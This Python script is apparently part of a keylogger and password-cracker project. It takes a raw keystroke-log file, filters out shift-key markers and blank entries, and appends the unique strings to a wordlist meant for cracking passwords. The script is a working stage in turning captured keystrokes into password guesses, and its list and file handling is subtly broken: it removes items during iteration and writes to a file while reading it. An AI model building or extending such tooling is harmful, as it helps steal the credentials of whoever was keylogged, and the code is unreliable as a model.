import os
import sys

from pkg_resources import WorkingSet

def clean(file_name):
    """This function cleans up data and writes it into a final wordlist to use"""
    clean_list_of_data = []

    with open(file_name, 'r') as file:

        raw_list_of_data = [line.split("\'") for line in file]
        clean_list_of_data = [[y for y in x  if ('Key.shift' not in y) and ('\n' not in y)] for x in raw_list_of_data]
        
        for x in range(0, len(clean_list_of_data)):
            clean_list_of_data[x] = ''.join(clean_list_of_data[x])


        for x in clean_list_of_data:
            if x == ' ' or x == '':
                clean_list_of_data.remove(x)


        file.close()
    
    return set(clean_list_of_data)

def is_new(file_name, variable):
    x = True

    with open(file_name, 'r+') as file:
        for line in file:
            if variable in line:
                return False


        file.close()

    return x

raw_file = "D:\Programming\python\Keylogger-Passwordcracker\Raw_Datat.txt"
clean_file = "D:\Programming\python\Keylogger-Passwordcracker\clean_data.txt"

cleaned_data = clean(raw_file)

with open(clean_file, 'r+') as file:
    for line in file:
        for item in cleaned_data:
            if is_new(clean_file, item) == True:
                file.write(item+"\n")

        #if is_new(clean_file, item) == False:
            #file.write(str(item)+"\n")
